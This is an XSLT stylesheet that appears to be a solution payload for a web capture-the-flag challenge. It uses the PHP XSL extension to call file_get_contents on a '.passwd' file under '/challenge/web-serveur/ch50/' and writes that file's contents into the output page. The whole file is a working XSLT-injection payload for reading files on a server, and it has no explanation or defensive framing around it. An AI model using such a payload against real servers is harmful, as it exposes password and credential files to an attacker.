<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="/">
    <html>
      <body>
        <xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/.passwd')" />
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
